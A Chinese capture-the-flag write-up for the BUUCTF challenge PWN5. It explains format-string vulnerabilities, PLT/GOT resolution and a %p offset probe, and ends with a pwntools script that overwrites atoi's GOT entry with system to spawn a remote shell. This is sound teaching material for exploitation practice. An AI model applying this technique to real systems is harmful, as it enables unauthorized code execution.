# BUUCTF-PWN-[第五空间2019 决赛]PWN5

这题考到格式化字符串的方法 我之前没有学过 根据wp写完这题去看看原理

下载打开环境

checksec看看



<img src="https://i-blog.csdnimg.cn/blog_migrate/dabee577681c25e7a16f747959b68d50.png" alt="" style="max-height:212px; box-sizing:content-box;" />


发现有三个保护 nx打开 所以无法写入shellcode

现在看看ida32



<img src="https://i-blog.csdnimg.cn/blog_migrate/c5bd0252300de1a42c15381fd2e78f37.png" alt="" style="max-height:448px; box-sizing:content-box;" />


发现/bin/sh

进去看



<img src="https://i-blog.csdnimg.cn/blog_migrate/1ad995790c105f594750d4f159297748.png" alt="" style="max-height:635px; box-sizing:content-box;" />


发现就在主函数里面

我们进行代码审计 发现输入名字 他会返回名字 然后再输入密码 如果密码和unk_804c044一样 输出shellcode

我们看看这个函数是什么

搜索一下



<img src="https://i-blog.csdnimg.cn/blog_migrate/9a9902bf17c4b0a64bb585d1a15860ec.png" alt="" style="max-height:132px; box-sizing:content-box;" />




发现是随机数 这样我们就无法通过判断得到shellcode

我们现在又两个方法

## 1. 将atoi的判断变为system 然后手动输入/bin/sh

这样他就会在判断的时候进行执行shellcode

我们开始查找

在这之前我们需要了解 got和plt



<img src="https://i-blog.csdnimg.cn/blog_migrate/46001666609740d1ca7465053e15cd17.png" alt="" style="max-height:247px; box-sizing:content-box;" />


因为我们需要plt里面的shellcode进行执行

## plt和got是什么

这两个其实就是两个表 我们的函数进行执行

必须要通过这两个表去寻找 函数的真正地址 因为是经过

```haskell
plt ->got ->plt ->存储函数地址的函数->atoi的真正地址
```

我们在执行atoi这个函数的前面 他不会给我们函数的地址 只有运行到这个函数了

他才会给函数进行分配地址

在第一次运行该函数的时候 他就会进行上述的操作

第二次就不会了

```haskell
plt->got->atoi
```

直接就能找到

类似于中转站

继续做题

我们知道了plt和got

我们要如何构造呢



<img src="https://i-blog.csdnimg.cn/blog_migrate/88f78472d6d161d256003fd0b2cbcdda.png" alt="" style="max-height:263px; box-sizing:content-box;" />


我们发现plt中存在system和atoi



<img src="https://i-blog.csdnimg.cn/blog_migrate/5aa8fef003a1619842f9f4415bfe9e0c.png" alt="" style="max-height:104px; box-sizing:content-box;" />


而atoi又存在和我们输入的东西进行if判断

那如果我们在执行的时候 把atoi的got指向system的plt呢

```haskell
atoi.plt->atoi.got->system.plt->函数->system
```

这样我们就得到system函数

如果我们输入了/bin/sh 那他就会执行

```perl
system('/bin/sh')
```

这样就成功了

但是有一个问题 我们利用这个是通过print函数的漏洞

我们输入的东西会在调用函数前先压入栈内 我们不知道我们该什么时候进行更改

所以我们需要计算出偏移量 这里就可以使用格式化字符串

## 格式化字符串

因为这个漏洞是通过print函数出现的

因为程序员的偷懒

```python
print("%d",str)
print(str)
```

这两种看似是一样的 但是第二种就很容易出现格式化字符串漏洞

因为没有对输出字符串进行规定

我们可以一直构造 %p来查看地址

例如

```less
AAAA -%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p
```

因为输出没有管理

所以他会把str 直接进行查找

查完AAAA 开始执行%p

%d 用于读取10进制数值

%x 用于读取16进制数值

%s 用于读取字符串值

%n 用于讲当前字符串的长度打印到var中，例printf（"test %hn",&var[其中var为两个字节]） printf（"test %n",&var[其中var为一个字节]）

| %p | 输出十六进制数据，区别是有前缀“0x”，实际上就是输出个指针，所以32位输出4字节，64位输出8字节 |
|:---:|:---:|





我们可以进行产生 看看有没有字符串漏洞的产生



<img src="https://i-blog.csdnimg.cn/blog_migrate/927d6f04e48f06a9d01dc42330eb7cba.png" alt="" style="max-height:75px; box-sizing:content-box;" />


我的理解是这样的

<img src="https://i-blog.csdnimg.cn/blog_migrate/828b4f939c6e72c03e36a6a6223bfab0.png" alt="" style="max-height:734px; box-sizing:content-box;" />




我们发现 到4141414 有10个量 就是他从压入栈到执行 需要10个偏移量

所以我们

我们开始写exp

```cobol
from pwn import *
p=remote('node4.buuoj.cn',25418)
elf=ELF('./pwn')
atoi_got=elf.got['atoi']
system_plf=elf.plt['system']
payload=fmtstr_payload(10,{atoi_got:system_plf})
p.sendline(payload)
p.sendline('/bin/sh')
p.interactive()
```